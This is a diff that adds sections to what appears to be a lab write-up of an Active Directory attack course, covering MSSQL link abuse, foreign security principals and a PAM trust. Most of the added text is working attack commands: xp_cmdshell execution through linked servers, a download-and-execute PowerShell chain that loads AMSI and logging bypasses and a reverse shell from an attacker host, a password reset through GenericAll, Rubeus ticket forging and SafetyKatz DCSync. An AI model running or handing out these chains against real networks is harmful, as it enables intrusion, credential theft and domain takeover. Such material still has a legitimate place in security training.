@@ -1094,7 +1094,7 @@ C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "lsadump::dcsync /
 ```
 {% endcode %}
 
-## Flag 45 - Printer Bug to another domain
+## Flag 45 to 49 - Printer Bug to another domain
 
 If TGT Delegation is enabled across forests trusts, we can abuse the printer bug across two-way forest trusts as well
 
@@ -1251,3 +1251,182 @@ Now use the generated ticket to ask a tgs
 
 
 
+## Flag 50/51/52 - MSSQL
+
+Use PowerupSQL to enumerate for any database in the domain
+
+```powershell
+Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
+```
+
+<figure><img src="../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
+
+So we have non-sysadmin access to us-mssql. Let's enumerate database links for us-mssql:
+
+```powershell
+Get-SQLServerLink -Instance us-mssql.us.techcorp.local -Verbose
+```
+
+<figure><img src="../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
+
+Use Get-SQLServerLinkCrawl from PowerUpSQL for crawling the database links automatically:
+
+```powershell
+Get-SQLServerLinkCrawl -Instance us-mssql -Verbose
+```
+
+<figure><img src="../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>
+
+If xp\_cmdshell is enabled (or rpcout is true that allows us to enable xp\_cmdshell), it is possible to execute commands on any node in the database links using the below commands.
+
+{% code overflow="wrap" %}
+```powershell
+Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''whoami'''
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
+
+Invoke a reverse shell. Host a listener with powercat
+
+```
+. .\powercat.ps1
+powercat -l -v -p 443 -t 1000
+```
+
+{% code overflow="wrap" %}
+```
+Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://192.168.100.64/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.100.64/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.100.64/Invoke-PowerShellTcpEx.ps1)"'''
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
+
+Because the link from DB-SQLProd to DB-SQLSrv is configured to use sa. We can enable RPC Out and xp\_cmdshell on DB-SQLSrv! Run the below commands on the reverse shell we got above.
+
+<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">Invoke-SqlCmd -Query "exec sp_serveroption @server='db-sqlsrv', @optname='rpc', @optvalue='TRUE'"
+Invoke-SqlCmd -Query "exec sp_serveroption @server='db-sqlsrv', @optname='rpc out', @optvalue='TRUE'"
+Invoke-SqlCmd -Query "EXECUTE ('sp_configure ''show advanced options'',1;reconfigure;') AT ""db-sqlsrv"""
+<strong>Invoke-SqlCmd -Query "EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure') AT ""db-sqlsrv"""
+</strong></code></pre>
+
+and now launch a reverse shell again on the other server
+
+{% code overflow="wrap" %}
+```powershell
+Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://192.168.100.64/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.100.64/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.100.64/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget db-sqlsrv
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>
+
+## Flag 53/54 - FSPs
+
+Load PowerView in the reverse shell to enumerate the trusts
+
+```powershell
+iex (New-Object Net.WebClient).DownloadString('http://192.168.100.64/PowerView.ps1')
+```
+
+```
+Get-ForestTrust
+```
+
+<figure><img src="../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>
+
+Enumerate interesting ACLs againt this domain
+
+```powershell
+Find-InterestingDomainAcl -ResolveGUIDs -Domain dbvendor.local
+```
+
+With GenericAll we can try to reset the password of the found user
+
+{% code overflow="wrap" %}
+```powershell
+Set-DomainUserPassword -Identity db64svc -AccountPassword (ConvertTo-SecureString 'Password@123' -AsPlainText -Force) -Domain dbvendor.local –Verbose
+```
+{% endcode %}
+
+Now with access to this user try to look for FSPs:
+
+```
+Find-ForeignGroup –Verbose
+```
+
+<figure><img src="../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>
+
+{% code overflow="wrap" %}
+```
+Get-DomainUser -Domain dbvendor.local | ?{$_.ObjectSid -eq 'S-1-5-21-569087967-1859921580-1949641513-4101'}
+```
+{% endcode %}
+
+which is the user that we previously pwn, so we are administrator in the domain
+
+## Flag 55 - PAM trust
+
+Enumerate FSPs on bastion.local to check if there is anything interesting with AD-Module:
+
+{% code overflow="wrap" %}
+```powershell
+Get-ADObject -Filter {objectClass -eq "foreignSecurityPrincipal"} -Server bastion.local
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>
+
+So, the DA of techcorp.local is a part of a group on bastion.local. To find out which group it is a member of, run the below command:
+
+{% code overflow="wrap" %}
+```powershell
+Get-ADGroup -Filter * -Properties Member -Server bastion.local | ?{$_.Member -match 'S-1-5-21-2781415573-3701854478-2406986946-500'}
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>
+
+Craft a tgt as Domain Admin of techcorp.local to access bastion.local dc
+
+{% code overflow="wrap" %}
+```
+C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args asktgt /domain:techcorp.local /user:administrator /aes256:58db3c598315bf030d4f1f07021d364ba9350444e3f391e167938dd998836883 /dc:techcorp-dc.techcorp.local /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+{% endcode %}
+
+DCSync bastion dc to retrieve his administrator hash
+
+{% code overflow="wrap" %}
+```
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::dcsync /user:bastion\Administrator" "exit"
+```
+{% endcode %}
+
+Bastion admin aes: _a32d8d07a45e115fa499cf58a2d98ef5bf49717af58bc4961c94c3c95fc03292_
+
+now craft a tgt
+
+{% code overflow="wrap" %}
+```
+C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args asktgt /domain:bastion.local /user:administrator /aes256:a32d8d07a45e115fa499cf58a2d98ef5bf49717af58bc4961c94c3c95fc03292 /dc:bastion-dc.bastion.local /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+{% endcode %}
+
+Transfer invishell on bastion.local
+
+{% code overflow="wrap" %}
+```
+echo F | xcopy C:\AD\Tools\InviShell\InShellProf.dll \\bastion-dc.bastion.local\C$\Users\Public\InShellProf.dll /Y
+echo F | xcopy C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat \\bastion-dc.bastion.local\C$\Users\Public\RunWithRegistryNonAdmin.bat /Y
+```
+{% endcode %}
+
+Now access with winrs and launch invishell
+
+Now with AD-Module check if there is any PAM trust:
+
+{% code overflow="wrap" %}
+```powershell
+Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}
+```
+{% endcode %}
